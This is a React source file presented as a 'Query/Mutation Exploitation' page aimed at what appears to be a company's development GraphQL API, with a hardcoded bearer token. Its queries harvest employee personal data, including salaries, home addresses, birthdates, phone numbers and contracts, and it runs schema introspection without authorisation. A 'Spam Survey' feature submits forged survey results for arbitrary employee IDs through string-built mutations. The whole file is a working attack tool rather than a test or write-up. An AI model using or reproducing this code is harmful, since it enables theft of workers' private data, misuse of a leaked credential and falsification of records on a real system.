import { split } from "lodash";
import React, { useEffect, useState } from "react";

function Exploitation({ ...pageProps }) {
  const [gqlUrl, setGqlUrl] = useState(
    "https://api-dev.pulse.outsourced.ph/graphql"
  );

  const [authorization, setAuthorization] = useState(
    "Bearer 4110|TMIeHeREbhHcMXtWfVnI7NVSRDgDrt4tl0IWXgmZ40501618"
  );
  const [jsonData, setJsonData] = useState([]);
  const [schemeExploitation, setSchemeExploitation] = useState([]);

  useEffect(() => {
    const query = `{
      me {
        id
        first_name
        last_name
        email
        profile_picture
        role_id
        user_type
        role {
          permission_paths
          permissions {
            value
            label
            path
            items {
              value
              path
              label
              items {
                value
                path
                label
                items {
                  value
                  path
                  label
                  items {
                    label
                    path
                    value
                    items {
                      label
                      path
                      value
                      items {
                        label
                        path
                        value
                        items {
                          label
                          path
                          value
                          items {
                            label
                            path
                            value
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
  
      birthdays {
        employees_this_month {
          hris_id
          id
          nickname
          full_name
          first_name
          last_name
          employee_number
          age
          gender
          civil_status
          date_of_birth

          notes {
            title
            body
          }
  
          user {
            id
            email
            role_id
            primary_address {
              is_primary
              line_1
              line_2
              city
              state
              zip
              country
            }
    
            role {
              role_name
            }
    
            employee {
              employment_details {
                employee_number
              }
            }
          }
  
          work_information {
            gross_salary
            separation_date
          }
    
          contact_information {
            email
          }

          company {
            crm_id
            name
            charge_type
            signed_status
            sales_agent

            primary_contact {
              first_name
            }

            contacts {
              first_name
            }

            contract {
              contract_link
            }

          }
        }
      }
    
    
      anniversaries_report {
        employees_this_month {
          hris_id
          id
          nickname
          full_name
          first_name
          last_name
          employee_number
          age
          gender
          civil_status
          date_of_birth

          contact_information {
            id
            email
          }

          notes {
            title
            body
          }
  
          user {
            id
            email
            role_id
            primary_address {
              is_primary
              line_1
              line_2
              city
              state
              zip
              country
            }
    
            role {
              role_name
            }
    
            employee {
              employment_details {
                employee_number
                gross_salary
              }
            }
          }

          work_information {
            gross_salary
            separation_date
          }
    
          contact_information {
            email
          }

          company {
            crm_id
            name
            charge_type
            signed_status
            sales_agent

            primary_contact {
              first_name
            }

            contacts {
              first_name
            }

            contract {
              contract_link
            }
          }
        }
      }
    
      
    
      posts (pagination: {page_number: 1, page_size: 100000}) {
        values {
          reactions {
            users {
              email
              id
              user_type
    
              personal_details {
                phone_number
                date_of_birth
                first_name
                last_name
                middle_name
                user_id
              }

              employee {
                employment_details {
                  gross_salary
                }
                salary_history {
                  notes
                }
              }
    
              primary_address {
                line_1
                line_2
                city
                state
                zip
              }

              addresses {
                line_1
                line_2
                city
                state
                zip
              }
            }
          }
        }
      }
    }
    `;

    fetch(gqlUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: authorization,
      },
      body: JSON.stringify({
        query: query,
      }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        return response.json(); // Parse the response JSON
      })
      .then((data) => {
        setJsonData(data);
        console.log("User created:", data);
      })
      .catch((error) => {
        console.error("Error executing GraphQL mutation:", error);
      });

    const introspection = `
        {
          __schema {
            queryType {
              name
            }
            mutationType {
              name
            }
            subscriptionType {
              name
            }
            types {
              ...FullType
            }
            directives {
              name description locations args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind name description fields(includeDeprecated: true) {
            name description args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name description isDeprecated deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        fragment InputValue on __InputValue {
          name description type {
            ...TypeRef
          }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind name ofType {
            kind name ofType {
              kind name ofType {
                kind name ofType {
                  kind name ofType {
                    kind name ofType {
                      kind name ofType {
                        kind name
                      }
                    }
                  }
                }
              }
            }
          }
        }
          `;

    fetch(gqlUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        query: introspection,
      }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        return response.json(); // Parse the response JSON
      })
      .then((data) => {
        setSchemeExploitation(data);
        console.log("User created:", data);
      })
      .catch((error) => {
        console.error("Error executing GraphQL mutation:", error);
      });
  }, [authorization, gqlUrl]);

  const [employeeIds, setEmployeeIds] = useState("");
  const [rating, setRating] = useState("1");
  const [comment, setComment] = useState("need salary increase!!!");

  const addSpamSurvey = () => {
    const employeeIdsArray = employeeIds.split(",");

    employeeIdsArray.map((employeeId, k) => {
      const mutationQuery = `
        mutation {
            submitHappinessSurveyResult(
              values: { employee_id: ${employeeId}, rating: ${rating}, comment: "${comment}" }
            ) {
              field_validation_messages
              debug_message
              message
              success
            }
        }
      `;
      fetch(gqlUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: authorization,
        },
        body: JSON.stringify({
          query: mutationQuery,
        }),
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
          }

          return response.json(); // Parse the response JSON
        })
        .then((data) => {
          console.log("User created:", data);
        })
        .catch((error) => {
          console.error("Error executing GraphQL mutation:", error);
        });
    });
  };

  return (
    <div className="p-10">
      <div className="flex flex-col text-center">
        <h1 className="text-4xl text-center mb-4 font-bold mb-2">
          Query/Mutation Exploitation
        </h1>
        <p className="mb-4 text-xl">
          <input
            type="text"
            onChange={(e) => setGqlUrl(e.target.value)}
            className=" p-2 px-6 border border-gray-600 text-center w-3/5"
            placeholder="Endpoint Url"
            value={gqlUrl}
          />
        </p>
        <div className="text-center mb-4">
          <input
            type="text"
            onChange={(e) => setAuthorization(e.target.value)}
            className=" p-2 px-6 border border-gray-600 text-center w-3/5"
            placeholder="Add Authorization"
          />
        </div>
      </div>

      <div className="flex gap-4">
        <div className=" w-1/2 border border-gray-400 p-4 text-wrap">
          <h2 className="text-2xl text-center font-bold">Introspection</h2>
          <pre className="text-wrap break-words">
            {JSON.stringify(schemeExploitation, null, 2)}
          </pre>
        </div>

        <div className=" w-1/2 border border-gray-400 p-4 text-wrap">
          <div className=" text-center">
            <h2 className="text-2xl text-center font-bold">Mutation</h2>
            <div className="flex gap-2 items-center justify-center my-4">
              <input
                type="text"
                onChange={(e) => setEmployeeIds(e.target.value)}
                className=" p-2 px-6 border border-gray-600 text-center w-36"
                placeholder="Employee ID"
              />
              <input
                type="text"
                onChange={(e) => setRating(e.target.value)}
                className=" p-2 px-6 border border-gray-600 text-center w-24"
                placeholder="Rating"
              />
              <input
                type="text"
                onChange={(e) => setComment(e.target.value)}
                className=" p-2 px-6 border border-gray-600 text-center w-36"
                placeholder="Comment"
              />
              <button
                onClick={(e) => addSpamSurvey()}
                className="bg-red-600 p-2 text-lg text-white rounded-md "
              >
                Spam Survey
              </button>
            </div>
          </div>
          <hr className="my-6" />
          <h2 className="text-2xl text-center font-bold">Fetch</h2>
          <pre className="text-wrap break-words">
            {JSON.stringify(jsonData, null, 2)}
          </pre>
        </div>
      </div>
    </div>
  );
}

export default Exploitation;
